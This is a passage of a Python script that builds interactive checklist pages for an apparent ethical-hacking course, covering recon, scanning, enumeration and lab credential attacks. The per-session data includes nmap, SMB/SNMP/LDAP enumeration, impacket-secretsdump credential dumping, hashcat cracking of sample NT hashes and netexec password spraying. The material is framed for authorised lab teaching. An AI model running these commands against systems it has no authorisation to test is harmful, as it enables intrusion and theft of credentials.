#!/usr/bin/env python3
"""
Generate the interactive per-session team report page (docs/session-NN/report.html)
from one shared template + per-session step data. Uses the shared design system
(assets/css/ceh.css) and the report engine (assets/js/report.js).

  python3 scripts/gen_session_report.py            # regenerate every session below
  python3 scripts/gen_session_report.py s3-scan    # just one

Each step's data fields (example / collect / why / name / cmd) are RAW HTML — write
entities where needed. Regenerating a page never changes its data-report id, so a
team's saved progress (localStorage) survives edits to the reference text.
One report per session; add a new key to SESSIONS to give a future session its own.
"""
import os, sys, io

DOCS = os.environ.get('CEH_DOCS') or os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'docs')

TEAM_FIELDS = '''      <div class="rep-fields">
        <div class="rep-field"><label>Team name</label><input data-field="team" data-label="Team" placeholder="e.g. Team Nightowl" autocomplete="off"></div>
        <div class="rep-field"><label>Date</label><input data-field="date" data-label="Date" placeholder="2026-09-01" autocomplete="off"></div>
        <div class="rep-field wide"><label>Members</label><input data-field="members" data-label="Members" placeholder="Names of everyone on the team" autocomplete="off"></div>
        <div class="rep-field"><label>Target (in-scope host/domain)</label><input data-field="target" data-label="Target" placeholder="target.com" autocomplete="off"></div>
        <div class="rep-field"><label>Program / engagement</label><input data-field="program" data-label="Program" placeholder="HackerOne / Bugcrowd / lab engagement" autocomplete="off"></div>
        <div class="rep-field wide"><label>Scope URL (the policy / authorisation you read)</label><input data-field="scope_url" data-label="Scope URL" placeholder="https://…/security  ·  or the lab authorisation note" autocomplete="off"></div>
      </div>'''


def step_html(s, prefix, current):
    sid = prefix + '-' + s['id']
    active = ' data-active' if s.get('active') else ''
    curattr = ' data-current' if current else ''
    exlbl = s.get('exlabel', 'Example output')
    lis = ''.join('\n              <li>%s</li>' % x for x in s['collect'])
    return '''
      <div class="rep-step" data-step="{sid}">
        <label class="rep-check"><input type="checkbox" data-check="{sid}"{active}{cur}><span class="rep-box"></span></label>
        <div class="rep-main">
          <div class="rep-row"><span class="rep-name">{name}</span><code class="rep-cmd">{cmd}</code><button class="rep-toggle" aria-expanded="false"></button></div>
          <div class="rep-detail">
            <div class="rep-out"><div class="rep-lbl">{exlbl}</div><pre>{example}</pre></div>
            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>{lis}
            </ul></div>
            <div class="rep-why"><b>Why it matters later:</b> {why}</div>
          </div>
          <textarea class="rep-notes" data-notes="{sid}" placeholder="{ph}"></textarea>
        </div>
      </div>'''.format(sid=sid, active=active, cur=curattr, name=s['name'], cmd=s['cmd'],
                       exlbl=exlbl, example=s['example'], lis=lis, why=s['why'], ph=s['ph'])


def free_html(f, prefix):
    fid = prefix + '-' + f['id']
    return '''
      <div class="rep-free">
        <span class="rep-free-label">{label}</span>
        <p class="rep-free-hint">{hint}</p>
        <textarea data-notes="{fid}" placeholder="{ph}"></textarea>
      </div>'''.format(label=f['label'], hint=f['hint'], fid=fid, ph=f['ph'])


def build(key, d, all_sessions):
    # A session's report is cumulative: it shows every session with num <= this one,
    # earlier ones collapsed, the current one open. Ids are namespaced per session
    # (s2-a1, s3-b1, …) so the shared store carries a team's answers across pages.
    cur = int(d['num']); cur_prefix = 's' + str(cur)
    included = sorted([(k, v) for k, v in all_sessions.items() if int(v['num']) <= cur],
                      key=lambda kv: int(kv[1]['num']))
    n_steps = 0
    groups = []
    for k2, d2 in included:
        p2 = 's' + str(int(d2['num'])); is_cur = (k2 == key)
        gtitle = 'Session %s &middot; %s' % (d2['num'], d2['short'])
        inner = []
        for sec in d2['sections']:
            inner.append('\n        <h3 class="rep-sec">%s</h3>' % sec['name'])
            for it in sec['items']:
                if it.get('t') == 'free':
                    inner.append(free_html(it, p2))
                else:
                    inner.append(step_html(it, p2, is_cur)); n_steps += 1
        inner = ''.join(inner)
        if is_cur:
            groups.append('\n      <section class="rep-group current" data-group-title="%s">'
                          '\n        <div class="rep-group-title--cur">%s <span class="rep-group-tag now">this session</span></div>%s'
                          '\n      </section>' % (gtitle, gtitle, inner))
        else:
            groups.append('\n      <details class="rep-group" data-group-title="%s">'
                          '\n        <summary><span class="rep-group-title">%s</span><span class="rep-group-tag">carried forward</span></summary>'
                          '\n        <div class="rep-group-body">%s\n        </div>\n      </details>' % (gtitle, gtitle, inner))
    body = ''.join(groups)

    return '''<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Session {num} — {title} | CEH · ITGate Academy</title>
<meta name="description" content="{desc}">
<link rel="stylesheet" href="../assets/css/ceh.css">
<link rel="icon" href="../assets/img/itgate-logo.jpg">
</head>
<body>

<header class="topbar">
  <div class="wrap topbar-inner">
    <a class="brand" href="../index.html">
      <img src="../assets/img/itgate-logo.jpg" alt="ITGate Academy">
      <span class="brand-text">
        <span class="brand-name">ITGate Academy</span>
        <span class="brand-sub">CEH · Session {num} Report</span>
      </span>
    </a>
    <nav class="topnav">
      <a href="index.html">Session {snum_short}</a>
      <a href="../index.html">All sessions</a>
    </nav>
  </div>
</header>

<main class="wrap section">
  <div data-report="{key}" data-report-title="{report_title}" data-current="{cur_prefix}">

    <div class="page-head">
      <div class="kicker"><span class="snum">S{num}</span><span class="tag lab">Cumulative team deliverable</span><span class="time">⏱ fill as you work</span></div>
      <h1>{title}</h1>
      <p class="lede">{lede}</p>
    </div>

    <div class="rep-head">
      <h2>Engagement header</h2>
      <p>Fill this once. It prints at the top of your exported report.</p>
{team}
    </div>

    <div class="rep-bar">
      <div class="rep-prog"><b data-progress>0 / {n} steps</b><span class="pbar"><span data-progress-bar></span></span></div>
      <div class="rep-actions">
        <span class="rep-saved" data-saved>saved ✓</span>
        <button class="rep-btn primary" data-export-html>⭳ Download HTML</button>
        <button class="rep-btn" data-export-pdf>🖨 Save as PDF</button>
        <button class="rep-btn ghost" data-clear>Clear</button>
      </div>
    </div>

    <div class="rep-gate" data-gate="{gate}"><b>⚠ Stop.</b> You have ticked an <b>active</b> step in this session, but its <b>scope &amp; authorization check</b> is not signed off. Confirm you are authorised to test this target first — active testing outside an authorised scope is illegal and voids safe harbour.</div>

    <div data-report-body>
{body}
    </div>

    <div class="box tip" style="margin-top:22px">
      <span class="box-t">How your team keeps this</span>
      <p>This report saves automatically in <strong>the browser you are using now</strong> — reopen the page on the same machine and it is still here. To hand it in or share it between teammates, use <strong>Download HTML</strong> (a single file) or <strong>Save as PDF</strong>. It does not sync between devices on its own.</p>
    </div>

  </div>
</main>

<footer class="footer">
  <div class="wrap footer-inner">
    <span>CEH Diploma · ITGate Academy · Session {snum_short} team deliverable</span>
    <span><a href="index.html">← Back to Session {snum_short}</a></span>
  </div>
</footer>

<script src="../assets/js/report.js"></script>
</body>
</html>
'''.format(num=d['num'], snum_short=str(int(d['num'])), title=d['title'], desc=d['desc'],
           key=key, report_title=d['report_title'], lede=d['lede'], team=TEAM_FIELDS,
           n=n_steps, gate=cur_prefix + '-a1', cur_prefix=cur_prefix, body=body)


# ==========================================================================
#  Per-session data
# ==========================================================================
SESSIONS = {}

# ---- placeholder; real data appended below by data module ----

SESSIONS['s2-recon'] = {
  'num': '02', 'gate': 'a1', 'short': 'Reconnaissance',
  'title': 'Team Recon Report',
  'report_title': 'CEH Session 2 — Team Recon Report',
  'desc': 'CEH Diploma Session 2 team deliverable — an interactive recon checklist your team fills in against an authorised target, saves in the browser, and exports to HTML or PDF.',
  'lede': 'Work in your team against <strong>one authorised target</strong>. Tick each step as you do it, paste what you found, and click <em>example</em> to see what good output looks like and why it matters later. Everything saves in <strong>this browser</strong> — export to HTML or PDF to submit.',
  'sections': [
    {'name': 'A · Setup &amp; scope — do this first', 'items': [
      {'id':'a1','name':'Scope &amp; authorization check','cmd':'read the program policy — before any tool',
       'exlabel':'Example — what a scope page tells you',
       'example':'In scope:      *.target.com, api.target.com\nOut of scope:  blog.target.com (hosted WordPress)\nTesting:       automated scanning ALLOWED, max 5 req/s\nSafe harbour:  yes, if you stay in scope',
       'collect':['The exact <strong>in-scope</strong> domains/IPs — and the <strong>out-of-scope</strong> ones','Whether <strong>automated scanning is allowed</strong>, and any rate limit','Any required identifying header / test account','Whether the program offers <strong>safe harbour</strong>'],
       'why':'every step below must stay inside this scope. Touch an out-of-scope host and it is not a finding — it is unauthorised access. This line is what makes the whole engagement legal.',
       'ph':'In-scope: … | Out-of-scope: … | Scanning allowed? rate limit? | Safe harbour? …'},
    ]},
    {'name': 'B · Passive recon — no packets to the target', 'items': [
      {'id':'b1','name':'WHOIS / RDAP — who owns it','cmd':'whois target.com',
       'example':'Registrar:        MarkMonitor Inc.\nCreation Date:    2004-03-15\nRegistrant Org:   Target Holdings Ltd\nName Server:      NS1.TARGET.COM',
       'collect':['Registrant <strong>org name</strong> (pivot for cert / subdomain search)','The <strong>name servers</strong> — your AXFR targets in step C3','Domain <strong>age</strong> — old domains carry forgotten infrastructure'],
       'why':'the org name widens your subdomain hunt, and the name servers are exactly what you try a zone transfer against.',
       'ph':'Registrar / org / creation date / name servers…'},
      {'id':'b2','name':'DNS records','cmd':'dig target.com A MX NS TXT +noall +answer',
       'example':'target.com.  300 IN A    203.0.113.10\ntarget.com.  300 IN MX 10 mail.target.com.\ntarget.com.  300 IN TXT  "v=spf1 include:_spf.google.com ~all"',
       'collect':['<strong>A / AAAA</strong> IPs — the entry point for scanning','<strong>MX</strong> — the mail path','<strong>SPF / DMARC</strong> TXT — is spoofing possible?'],
       'why':'the IPs become Session 3&rsquo;s scan list; a missing/weak SPF or no DMARC is a phishing lead for Session 9.',
       'ph':'A/AAAA IPs / MX / NS / SPF-DMARC posture…'},
      {'id':'b3','name':'Certificate transparency — subdomains','cmd':"curl -s 'https://crt.sh/?q=%25.target.com&amp;output=json' | jq -r '.[].name_value' | sort -u",
       'example':'api.target.com\ndev.target.com\nuat.target.com\nvpn.target.com\nwww.target.com',
       'collect':['Every <strong>unique subdomain</strong> — especially <span class="mono">dev</span>, <span class="mono">uat</span>, <span class="mono">staging</span>, <span class="mono">vpn</span>','Names that hint at <strong>forgotten / internal</strong> systems'],
       'why':'subdomains ARE the attack surface. The old <span class="mono">uat</span> box is usually softer than the hardened homepage — you resolve and rank these in C1 and D1.',
       'ph':'Paste the subdomain list (or the interesting ones)…'},
      {'id':'b4','name':'Passive subdomain enumeration','cmd':'subfinder -d target.com -silent',
       'example':'www.target.com\napi.target.com\ncdn.target.com\nlegacy.target.com',
       'collect':['Merge with the crt.sh list into <strong>one master set</strong> of hosts','Note anything crt.sh did <strong>not</strong> already show'],
       'why':'different passive sources see different names — the union is your real host list, and it is the input to every active step.',
       'ph':'New hosts beyond crt.sh / total unique count…'},
      {'id':'b5','name':'Search-engine dorking','cmd':'site:target.com (ext:pdf | intitle:"index of" | inurl:admin)',
       'exlabel':'Example — dorks that pay off',
       'example':'site:target.com ext:pdf ext:xls    → exposed documents\nsite:target.com intitle:"index of"  → open directory listings\nsite:target.com inurl:admin|login   → portals\nsite:target.com "SQL syntax"        → leaky error pages',
       'collect':['Exposed <strong>documents</strong>, directory listings, <strong>admin / login</strong> portals','Error pages, exposed <strong>API docs</strong> / Swagger'],
       'why':'you found sensitive endpoints without a single packet at the app — these become web-testing targets in Session 8 and login targets in Session 4.',
       'ph':'Interesting URLs the dorks surfaced…'},
      {'id':'b6','name':'Exposed hosts &amp; tech — Shodan / Netcraft','cmd':'shodan host &lt;ip&gt;   ·   netcraft site report',
       'exlabel':'Example — Shodan host view',
       'example':'203.0.113.10  (Target Holdings Ltd, AS64500)\n  22/tcp   OpenSSH 7.4\n  443/tcp  nginx 1.18.0\n  8080/tcp Apache Tomcat 8.5.31   ← old',
       'collect':['Ports/services Shodan <strong>already</strong> saw (a free pre-scan)','<strong>Product + version</strong> banners, tech stack, hosting / ASN'],
       'why':'this is a no-touch preview of Session 3&rsquo;s scan, and every version string is a Session 4 CVE lookup (that Tomcat 8.5.31 is a lead).',
       'ph':'Ports / versions / tech / hosting seen passively…'},
      {'id':'b7','name':'Emails &amp; people OSINT','cmd':'theHarvester -d target.com -b bing,crtsh,duckduckgo',
       'example':'[emails]\na.hassan@target.com\nm.said@target.com\n[pattern] first-initial + lastname @ target.com',
       'collect':['Employee <strong>emails</strong> and the <strong>naming convention</strong> (predict the rest)','Likely <strong>usernames</strong>; any extra hosts (OWA / portal)'],
       'why':'the username convention is your Session 4 password-spray list, and the people are your Session 9 social-engineering targets. Mark generated emails "predicted", not "valid".',
       'ph':'Emails / naming convention / usernames…'},
    ]},
    {'name': 'C · Active recon — packets to the target (scope must be signed off)', 'items': [
      {'id':'c1','active':True,'name':'Resolve to live hosts','cmd':'subfinder -d target.com -silent | dnsx -silent -a -resp | httpx -silent -sc -title -td',
       'example':'https://www.target.com [200] [Target] [nginx]\nhttps://uat.target.com [200] [Staging Login] [Apache,PHP]\nhttps://vpn.target.com [200] [SSL VPN] [Fortinet]',
       'collect':['Which subdomains <strong>resolve AND are live</strong> (kill the dead ones)','Per host: <strong>status code, title, detected tech</strong>'],
       'why':'this turns a long passive list into the short list of <strong>real, reachable</strong> targets Session 3 actually scans.',
       'ph':'Live hosts + status + title + tech…'},
      {'id':'c2','active':True,'name':'Tech fingerprint','cmd':'whatweb -a3 https://uat.target.com',
       'example':'https://uat.target.com [200]\n  Apache[2.4.29], PHP[5.6.40], WordPress[5.2], WAF[none]',
       'collect':['Web server, <strong>CMS</strong>, frameworks, JS libs — <strong>with versions</strong>','Whether a <strong>WAF</strong> is present'],
       'why':'PHP 5.6 / WordPress 5.2 are direct CVE leads for Session 4; the CMS decides your Session 8 web attack path; "WAF: none" shapes Session 10 evasion.',
       'ph':'Server / CMS / frameworks / versions / WAF per host…'},
      {'id':'c3','active':True,'name':'Zone transfer attempt','cmd':'dig AXFR target.com @ns1.target.com',
       'exlabel':'Example — usually refused, occasionally a jackpot',
       'example':'# refused (the normal, secure case):\n; Transfer failed.\n\n# misconfigured (a high-severity finding):\nintranet.target.com. IN A 10.0.5.20  ← internal, leaked',
       'collect':['<strong>Refused</strong> or <strong>allowed</strong> — record it either way','If allowed: <strong>every record</strong>, especially internal names/IPs'],
       'why':'a successful AXFR dumps the whole host list at once — one of the highest-value recon findings there is. Try every name server from B1.',
       'ph':'Per name server: refused / allowed. If allowed, what leaked…'},
      {'id':'c4','active':True,'name':'Content / directory discovery','cmd':'ffuf -u https://uat.target.com/FUZZ -w common.txt -mc 200,301,403 -ac',
       'example':'admin        [Status: 301]\nbackup.zip   [Status: 200, Size: 4.1M]  ← !\n.git/        [Status: 403]\napi/v1       [Status: 200]',
       'collect':['Hidden <strong>dirs</strong>, <strong>admin/login</strong>, <strong>backups</strong> (.zip/.bak), config, <strong>API</strong> endpoints','<strong>403</strong>s — present but restricted (e.g. exposed <span class="mono">.git</span>)'],
       'why':'these endpoints are Session 8&rsquo;s web-testing surface and Session 4&rsquo;s login targets — a <span class="mono">backup.zip</span> or exposed <span class="mono">.git</span> can be the whole engagement.',
       'ph':'Paths found + status codes + anything juicy…'},
    ]},
    {'name': 'D · The deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · Ranked target list','hint':'Every live host, ordered by attacker interest — not by discovery order. This is the literal input to Session 3 scanning.',
       'ph':'# | host | IP | what it appears to be | why interesting | confidence | source\n1. uat.target.com | 203.0.113.20 | old staging login | PHP 5.6, no WAF, backup.zip exposed | high | httpx+ffuf'},
      {'t':'free','id':'d2','label':'D2 · Executive summary','hint':'3–5 sentences a non-technical manager reads. Overall exposure, the single worst finding, what to do this week. No jargon.','ph':'In three to five sentences…'},
      {'t':'free','id':'d3','label':'D3 · Scope statement','hint':'Confirm your work stayed inside the authorised scope.','ph':'All activity stayed within the in-scope domains listed in A1. No out-of-scope host was touched.'},
    ]},
  ],
}

SESSIONS['s3-scan'] = {
  'num': '03', 'gate': 'a1', 'short': 'Scanning &amp; Enumeration',
  'title': 'Team Scanning &amp; Enumeration Report',
  'report_title': 'CEH Session 3 — Team Scanning & Enumeration Report',
  'desc': 'CEH Diploma Session 3 team deliverable — an interactive scanning and enumeration checklist your team fills in against an authorised target, saves in the browser, and exports to HTML or PDF.',
  'lede': 'Take your Session 2 host list and make the target <strong>see you</strong>. Scanning is the loudest attacker stage — tick each step, paste what you found, click <em>example</em> for what good output looks like and why it matters next. Saves in <strong>this browser</strong>; export to HTML or PDF.',
  'sections': [
    {'name': 'A · Setup &amp; scope — do this first', 'items': [
      {'id':'a1','name':'Scope &amp; authorization check','cmd':'confirm scanning is allowed — before any packet',
       'exlabel':'Example — the line that authorises a scan',
       'example':'In scope:      203.0.113.0/24, *.target.com\nOut of scope:  shared/hosted assets\nTesting:       port scanning ALLOWED, max 5 req/s, no DoS\nWindow:        any time, identify with X-Bug-Hunter header',
       'collect':['That <strong>active scanning is explicitly allowed</strong>, and the <strong>rate limit</strong>','The in-scope <strong>IP ranges / hosts</strong> (scan nothing else)','Any forbidden test types (DoS, brute-force) and required test window'],
       'why':'a port scan is the first thing that reaches the target and the first thing its IDS logs. Everything below is active — outside an authorised scope it is an attack, not a test.',
       'ph':'Scanning allowed? rate limit? | In-scope ranges: … | Forbidden: DoS/brute? | Window …'},
    ]},
    {'name': 'B · Host discovery &amp; port scanning — packets to the target', 'items': [
      {'id':'b1','active':True,'name':'Live-host discovery','cmd':'nmap -sn 203.0.113.0/24 -oA sweep',
       'example':'Nmap scan report for 203.0.113.10  Host is up (0.011s)\nNmap scan report for 203.0.113.20  Host is up (0.009s)\nNmap done: 256 hosts, 4 up',
       'collect':['Which of your Session 2 hosts are actually <strong>up</strong>','New live IPs in-scope you did not have from recon'],
       'why':'you only scan live hosts — this trims the range so the loud full scan hits real targets, not dead space.',
       'ph':'Live IPs (from the sweep + your S2 list)…'},
      {'id':'b2','active':True,'name':'Full TCP port scan (SYN)','cmd':'nmap -sS -p- --min-rate 2000 -Pn 203.0.113.20 -oA allports',
       'example':'PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n3389/tcp open  ms-wbt-server\n8080/tcp open  http-proxy',
       'collect':['<strong>Every open TCP port</strong> per host (all 65535, not just top 1000)','Note the odd/high ports — they are where the interesting services hide'],
       'why':'this open-port list is the map for the rest of the session; each port becomes a service you enumerate in C, and a lead you rank in D.',
       'ph':'Open ports per host…'},
      {'id':'b3','active':True,'name':'Service &amp; version detection','cmd':'nmap -sV -sC -p22,80,443,3389,8080 203.0.113.20 -oA services',
       'example':'22/tcp   OpenSSH 7.4 (protocol 2.0)\n80/tcp   Apache httpd 2.4.29 ((Ubuntu))\n8080/tcp Apache Tomcat 8.5.31\n|_http-title: Staging Portal',
       'collect':['<strong>Service + exact version</strong> on every open port','Default-script findings (titles, certs, anonymous access)'],
       'why':'the version string is the whole game for Session 4 — <span class="mono">Tomcat 8.5.31</span> maps straight to a CVE. Vague "http" is useless; "Apache 2.4.29" is a lead.',
       'ph':'Service + version per port + any -sC script hits…'},
      {'id':'b4','active':True,'name':'OS detection','cmd':'nmap -O 203.0.113.20',
       'example':'Running: Linux 4.X\nOS CPE: cpe:/o:linux:linux_kernel:4.15\nOS details: Linux 4.15 - 5.6',
       'collect':['Best-guess <strong>OS and version</strong> per host','Whether it is Windows vs Linux — it changes every enumeration tool in C'],
       'why':'OS decides your toolset: SMB/LDAP for Windows, NFS/SSH for Linux — and Windows version hints at MS17-010-class exposure.',
       'ph':'OS guess per host…'},
      {'id':'b5','active':True,'name':'UDP top ports','cmd':'nmap -sU --top-ports 20 203.0.113.20',
       'example':'PORT    STATE         SERVICE\n53/udp  open          domain\n161/udp open          snmp   ← enumerate this\n500/udp open|filtered isakmp',
       'collect':['Open <strong>UDP</strong> services — especially <strong>161 (SNMP)</strong>, 53, 123, 500','TCP-only scans miss these entirely'],
       'why':'SNMP on 161 is a goldmine you enumerate in C3, and it is invisible to every TCP scan — this is the step teams forget.',
       'ph':'Open UDP ports (SNMP? DNS? IKE?)…'},
    ]},
    {'name': 'C · Enumeration — turn each service into detail', 'items': [
      {'id':'c1','active':True,'name':'Web (80/443/8080)','cmd':'whatweb https://203.0.113.20 ; nmap --script http-enum -p80,443,8080 203.0.113.20',
       'example':'HTTP/1.1 200  Apache/2.4.29  PHP/7.2\n/admin/    (Status: 401)\n/backup/   (Status: 200)\n/robots.txt (Status: 200)',
       'collect':['Server, framework, CMS + versions; <strong>directories &amp; admin panels</strong>','robots.txt, default pages, exposed backups'],
       'why':'feeds Session 8 web testing and Session 4 login targets; the version confirms your CVE leads from B3.',
       'ph':'Web tech / dirs / admin / backups per host…'},
      {'id':'c2','active':True,'name':'SMB (139/445)','cmd':'enum4linux-ng -A 203.0.113.20 ; nmap --script "smb-os-discovery,smb-enum-shares,smb-enum-users" -p445 203.0.113.20',
       'example':'OS: Windows Server 2019\nShares: ADMIN$, C$, IPC$, Backups (READ)\nUsers: administrator, svc_backup, m.said\n[note] modern Windows: null session refused',
       'collect':['<strong>Shares</strong> (readable ones especially), <strong>users</strong>, OS build, domain','Whether null/guest sessions work (legacy) or are refused (modern)'],
       'why':'usernames feed Session 4 spraying/Kerberoast; a readable share can hold creds; the modern-vs-legacy result tells you which attacks are even possible.',
       'ph':'Shares / users / OS / domain / null-session result…'},
      {'id':'c3','active':True,'name':'SNMP (161/udp)','cmd':'onesixtyone 203.0.113.20 public ; snmpwalk -v2c -c public 203.0.113.20',
       'example':'public   → community string valid\nsysDescr: Linux target 4.15\nhrSWRunName: /usr/sbin/sshd, mysqld, apache2\ninstalled software, listening ports, user accounts…',
       'collect':['A valid <strong>community string</strong> (try public/private/community)','Running processes, software, ports, user accounts, ARP tables'],
       'why':'a weak SNMP community string leaks the whole host inventory without a login — one of the fastest wins on the exam and in the field.',
       'ph':'Community string / sysDescr / processes / users leaked…'},
      {'id':'c4','active':True,'name':'LDAP / Active Directory (389/636)','cmd':'nmap --script ldap-rootdse -p389 dc.ceh.lab ; ldapsearch -x -H ldap://dc.ceh.lab -b "dc=ceh,dc=lab"',
       'example':'namingContext: DC=ceh,DC=lab\nCN=Administrator,CN=Users,DC=ceh,DC=lab\nCN=svc_sql,...  servicePrincipalName: MSSQL/...\nsAMAccountName: m.said, a.hassan',
       'collect':['The <strong>domain naming context</strong>, <strong>users</strong>, groups','Accounts with a <strong>servicePrincipalName</strong> (SPN) — Kerberoast targets'],
       'why':'this is the Session 4 attack surface: the user list is your spray list, and any SPN account is a Kerberoasting target.',
       'ph':'Domain / users / groups / SPN accounts…'},
      {'id':'c5','active':True,'name':'Other services (FTP/NFS/SMTP/RPC)','cmd':'showmount -e 203.0.113.30 ; smtp-user-enum -M VRFY -U users.txt -t 203.0.113.30 ; ftp 203.0.113.30',
       'example':'NFS: /home *  (world-readable export!)\nSMTP: 252 a.hassan (user exists)\nFTP: anonymous login ALLOWED',
       'collect':['Anonymous <strong>FTP</strong>, exported <strong>NFS</strong> shares, <strong>SMTP</strong> user enumeration','Any service that answers without a credential'],
       'why':'a world-readable NFS export or anonymous FTP is often a direct foothold, and SMTP VRFY confirms which usernames are real before you spray them.',
       'ph':'FTP anon? / NFS exports / SMTP valid users / RPC…'},
    ]},
    {'name': 'D · The deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · Target profile','hint':'One block per live host — the picture Session 4 attacks. This replaces a pile of tool dumps.',
       'ph':'host | IP | OS | open ports | service+version per port | key enum findings\n203.0.113.20 | Win2019 | 445,3389,8080 | SMB(2019), Tomcat 8.5.31 | shares: Backups(R); users: svc_backup,m.said'},
      {'t':'free','id':'d2','label':'D2 · Ranked exploitation leads','hint':'Version → likely weakness → which host. This is the direct input to Session 4 vulnerability analysis.',
       'ph':'1. Tomcat 8.5.31 on 203.0.113.20:8080 → known CVEs, check searchsploit\n2. svc_backup has SPN → Kerberoast candidate\n3. weak SNMP community on .30 → full inventory leak'},
      {'t':'free','id':'d3','label':'D3 · Detection note (the SOC flip)','hint':'What did your scans look like from the defender side? One line per noisy step — this is the tier-1 SOC skill.',
       'ph':'SYN scan → many SYNs, no ACK, from one source (firewall/IDS)\nSMB enum → 4625/anonymous logon events\nSNMP walk → burst of 161/udp from one host'},
      {'t':'free','id':'d4','label':'D4 · Scope statement','hint':'Confirm every packet stayed in scope.','ph':'All scanning stayed within the in-scope ranges in A1, within the stated rate limit. No out-of-scope host was scanned; no DoS/brute-force was run.'},
    ]},
  ],
}

SESSIONS['s4-access'] = {
  'num': '04', 'gate': 'a1', 'short': 'Vulnerability &amp; Access',
  'title': 'Team Vulnerability &amp; Access Report',
  'report_title': 'CEH Session 4 — Team Vulnerability & Access Report',
  'desc': 'CEH Diploma Session 4 team deliverable — an interactive vulnerability-analysis and credential-attack checklist for the authorised lab domain, saved in the browser, exported to HTML or PDF.',
  'lede': 'Turn Session 3&rsquo;s services and users into a <strong>way in</strong>. Match versions to weaknesses, then attack authentication on the <strong>authorised lab domain</strong>. Tick each step, paste evidence, click <em>example</em> for what good output looks like. Saves in <strong>this browser</strong>; export to HTML or PDF.',
  'sections': [
    {'name': 'A · Setup &amp; scope — do this first', 'items': [
      {'id':'a1','name':'Authorization check','cmd':'confirm you are on the authorised lab domain',
       'exlabel':'Example — what authorises a credential attack',
       'example':'Authorised targets:  ceh.lab domain — dc, WIN10-TGT01, WIN7-TGT01,\n                     Metasploitable2 (host-only lab network only)\nAllowed:             vuln scan, offline cracking, spray (lockout aware),\n                     Kerberoast, LLMNR poisoning\nNever:               a real bug-bounty target — password attacks are out of\n                     scope on every public program',
       'collect':['The exact <strong>authorised lab hosts</strong> — nothing outside the lab network','That the destructive/loud attacks (spray, poisoning) are <strong>lab-only</strong>','Lockout policy so a spray does not lock real accounts'],
       'why':'credential attacks (spray, Kerberoast, LLMNR poisoning) are <strong>never</strong> authorised on a bug-bounty target — they belong on the lab. This step is the line between a lab exercise and a crime.',
       'ph':'Authorised lab hosts: … | Attacks allowed: … | Lockout policy: … | NOT a public target'},
    ]},
    {'name': 'B · Vulnerability analysis', 'items': [
      {'id':'b1','name':'Version → exploit mapping','cmd':'searchsploit apache tomcat 8.5.31',
       'example':'Apache Tomcat 8.5.31 - ... | multiple/webapps/xxxxx.txt\n... Remote Code Execution ...\n(searchsploit -x <path> to read; -m <id> to copy)',
       'collect':['For each version from Session 3: <strong>is there a public exploit?</strong>','Exploit type (RCE / auth-bypass / info-leak) and whether it needs a login'],
       'why':'this is the offline half — searchsploit reads a local DB, so it touches nothing. A confirmed public RCE is a top-priority line in your access plan.',
       'ph':'Per service+version: public exploit? type? needs creds?…'},
      {'id':'b2','name':'CVE / CVSS triage','cmd':'lookup on nvd.nist.gov — record CVE + CVSS base + vector',
       'example':'CVE-2020-1938 (Ghostcat, Tomcat AJP)\nCVSS 3.1 base: 9.8 CRITICAL\nvector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
       'collect':['The <strong>CVE id</strong>, <strong>CVSS base score</strong> and the <strong>vector</strong> (not just the number)','Whether it is network-reachable and needs no privileges (the vector tells you)'],
       'why':'the score ranks your leads and the vector tells you if it is actually reachable — a 9.8 that needs local access is not your first move.',
       'ph':'CVE / CVSS base / vector / reachable?…'},
      {'id':'b3','active':True,'name':'Automated vulnerability scan','cmd':'Nessus Essentials  ·  or  openvas / gvm  (authorised lab hosts)',
       'example':'203.0.113.20\n  CRITICAL  Tomcat AJP Ghostcat (CVE-2020-1938)\n  HIGH      SMB signing not required\n  MEDIUM    TLS 1.0 enabled',
       'collect':['Confirmed findings by <strong>severity</strong>, with the plugin/CVE reference','False positives to weed out (cross-check with B1/B2)'],
       'why':'the scanner is fast but noisy and wrong sometimes — you confirm its criticals against your own version work before they enter the access plan. It is active, so lab-only.',
       'ph':'Critical/High findings + CVE refs + which are confirmed…'},
    ]},
    {'name': 'C · Authentication &amp; password attacks — lab domain only', 'items': [
      {'id':'c1','active':True,'name':'Capture / dump hashes','cmd':'impacket-secretsdump ceh.lab/user@dc  ·  or Responder capture on the wire',
       'example':'administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::\nsvc_backup:1104:aad3b...:e19ccf75ee54e06b06a5907af13cef42:::\n[SMB] NTLMv2 hash captured from WIN10-TGT01\\m.said',
       'collect':['<strong>NT hashes</strong> (from SAM/NTDS) or <strong>NetNTLMv2</strong> hashes (from the wire)','Which account each hash belongs to, and its privilege'],
       'why':'hashes are the raw material for C2 cracking and C4 Kerberoast; a captured admin hash may also enable pass-the-hash straight into Session 5.',
       'ph':'Hashes captured + account + source (SAM/NTDS/wire)…'},
      {'id':'c2','active':True,'name':'Offline cracking','cmd':'hashcat -m 1000 hashes.txt rockyou.txt   # 1000=NTLM, 5600=NetNTLMv2',
       'example':'e19ccf75ee54e06b06a5907af13cef42:Summer2026!\nStatus: Cracked  1/4\nsvc_backup → Summer2026!',
       'collect':['Which hashes <strong>cracked</strong>, and the <strong>plaintext</strong>','The right mode (1000 NTLM · 5600 NetNTLMv2 · 13100 Kerberoast · 1800 sha512crypt)'],
       'why':'a cracked service-account password is often domain-wide reuse — it becomes the credential in your access plan and the spray value in C3.',
       'ph':'Cracked user:password pairs + hash mode used…'},
      {'id':'c3','active':True,'name':'Password spraying','cmd':'netexec smb dc.ceh.lab -u users.txt -p "Summer2026!" --continue-on-success',
       'example':'SMB  dc.ceh.lab  [+] ceh.lab\\a.hassan:Summer2026! \nSMB  dc.ceh.lab  [-] ceh.lab\\m.said:Summer2026! (STATUS_LOGON_FAILURE)',
       'collect':['Accounts where <strong>one password worked</strong> across many users','Lockout threshold — <strong>one</strong> password per round, wait out the window'],
       'why':'spraying turns one cracked/guessed password into many footholds. Get the lockout math wrong and you lock the domain — which is why A1 recorded the policy.',
       'ph':'Valid user:password hits + lockout policy respected…'},
